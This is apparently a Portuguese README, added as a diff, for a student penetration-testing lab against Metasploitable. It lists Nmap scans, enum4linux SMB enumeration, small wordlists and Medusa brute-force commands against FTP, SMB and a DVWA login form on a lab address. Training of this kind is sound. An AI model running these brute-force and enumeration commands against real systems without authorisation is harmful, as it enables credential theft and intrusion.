@@ -1,1 +1,260 @@
+# Hacking Ético: Vulnerabilidades e Teste de Invasão
+
+Este projeto demonstra, de forma **educacional**, como funciona um processo básico de **teste de invasão (Pentest)** utilizando ferramentas populares de **cibersegurança**.
+
+O objetivo é compreender **vulnerabilidades de sistemas**, técnicas de **reconhecimento de rede**, **enumeração de serviços** e **testes de força bruta** em ambientes controlados.
+
+---
+
+# Ambiente Utilizado
+
+As atividades foram realizadas em um ambiente virtual utilizando:
+
+- **Oracle VirtualBox** – Software de virtualização
+- **Kali Linux** – Sistema operacional focado em segurança ofensiva
+- **Metasploitable** – Sistema propositalmente vulnerável para estudo
+
+Ambos os sistemas foram executados simultaneamente dentro da máquina virtual para simular um ambiente de ataque e alvo.
+
+---
+
+# Ferramentas Utilizadas
+
+Durante o módulo foram apresentadas diversas ferramentas utilizadas em **pentests**.
+
+## Nmap
+Ferramenta utilizada para **exploração de rede, auditoria de segurança e testes de intrusão**.  
+Permite identificar:
+
+- portas abertas
+- serviços ativos
+- versões de software
+- sistema operacional do alvo
+
+## Medusa
+Ferramenta de **código aberto** utilizada para **auditoria de senhas e ataques de força bruta** em diferentes serviços de rede.
+
+É bastante utilizada em **testes de penetração (pentest)** e já vem instalada no **Kali Linux**.
+
+---
+
+# Outras Ferramentas Citadas
+
+### Hydra
+Ferramenta usada para testar várias combinações de **usuário e senha** em serviços como SSH, FTP e páginas web.
+
+### Ncrack
+Ferramenta especializada em **testar autenticação em serviços de rede**, como SSH, FTP e RDP.
+
+### John the Ripper
+Ferramenta utilizada para **quebrar hashes de senha** e descobrir a senha original.
+
+### Patator
+Ferramenta modular usada para **ataques de força bruta avançados**, permitindo testes personalizados em diversos serviços.
+
+---
+
+# Sistema Metasploitable
+
+O **Metasploitable** é um sistema propositalmente vulnerável criado para **estudo de segurança da informação**.
+
+Ele permite que estudantes e profissionais pratiquem:
+
+- reconhecimento de rede
+- exploração de serviços
+- descoberta de vulnerabilidades
+- testes de invasão em ambiente controlado
+
+---
+
+# Lista Consolidada de Comandos
+
+## Ataque de Força Bruta em Login Web
+
+```bash
+medusa -h 10.10.10.50 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php' -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t 6
+```
+
+Realiza um ataque de força bruta em um formulário de login web específico, definindo os campos de usuário e senha.
+
+---
+
+## Enumeração de Sistema SMB
+
+```bash
+enum4linux -a 10.10.10.50 | tee enum4_output.txt
+```
+
+Ferramenta usada para coletar informações de sistemas **Windows e Samba**, incluindo:
+
+- usuários
+- compartilhamentos
+- políticas de rede
+
+O comando `tee` salva o resultado em um arquivo enquanto mostra no terminal.
+
+---
+
+## Criação de Lista de Usuários
+
+```bash
+echo -e "user\nnmsfadmin\nservice" > smb_users.txt
+```
+
+Cria uma lista de usuários para testes de autenticação no serviço SMB.
+
+---
+
+## Criação de Lista de Senhas
+
+```bash
+echo -e "password\n123456\nWelcome123\nnmsfadmin" > senhas_spray.txt
+```
+
+Cria uma **wordlist de senhas** para testes de login.
+
+---
+
+## Ataque de Força Bruta em SMB
+
+```bash
+medusa -h 10.10.10.50 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+```
+
+Executa tentativas de login contra o protocolo **SMB (Windows Networking)**.
+
+---
+
+## Listar Compartilhamentos SMB
+
+```bash
+smbclient -L //10.10.10.50 -U msfadmin
+```
+
+Lista os diretórios compartilhados no servidor SMB.
+
+---
+
+# Reconhecimento de Rede com Nmap
+
+## Scan rápido e agressivo
+
+```bash
+nmap -v -T5 -sS -Pn --open 10.10.10.0/24
+```
+
+Procura portas abertas rapidamente.
+
+---
+
+## Scan sem resolução DNS
+
+```bash
+nmap -n 10.10.10.0/24
+```
+
+Realiza o scan sem tentar resolver nomes de domínio.
+
+---
+
+## Detecção avançada de sistema
+
+```bash
+nmap -A 10.10.10.50
+```
+
+Detecta:
+
+- sistema operacional
+- versões de serviços
+- scripts de exploração
+
+---
+
+## Scan de portas específicas
+
+```bash
+nmap -sV -p 21,22,80,445,139 10.10.10.50
+```
+
+Verifica versões dos serviços:
+
+- FTP
+- SSH
+- HTTP
+- SMB
+
+---
+
+## Ajuda de scripts de exploração
+
+```bash
+nmap --script-help exploit
+```
+
+Lista scripts de exploração disponíveis no Nmap.
+
+---
+
+# Preparação de Wordlists
+
+## Lista de usuários
+
+```bash
+echo -e "user\nnmsfadmin\nnadmin\nroot" > users.txt
+```
+
+Cria uma lista de possíveis usuários.
+
+---
+
+## Lista de senhas
+
+```bash
+echo -e "123456\npassword\nqwerty\nnmsfadmin" > pass.txt
+```
+
+Cria uma lista de senhas comuns.
+
+---
+
+# Ataque de Força Bruta com Medusa
+
+## Ataque em servidor FTP
+
+```bash
+medusa -h 10.10.10.50 -U users.txt -P pass.txt -M ftp
+```
+
+Testa várias combinações de login no serviço FTP.
+
+---
+
+## Ataque em página web
+
+```bash
+medusa -h 10.10.10.50 -U users.txt -P pass.txt -M http -m PAGE:'/dvwa/login.php'
+```
+
+Tenta quebrar o login de uma página web.
+
+---
+
+## Ataque em formulário web
+
+```bash
+medusa -h 10.10.10.50 -U users.txt -P pass.txt -M http -m FORM:'username=^USER^&password=^PASS^'
+```
+
+Define como os dados de login são enviados no formulário.
+
+`^USER^` e `^PASS^` são variáveis substituídas automaticamente pelas listas.
+
+---
+
+# Aviso
+
+Este projeto possui **fins educacionais** e demonstra técnicas utilizadas em **testes de segurança autorizados**.
+
+Nunca utilize essas ferramentas contra sistemas **sem autorização**.
 
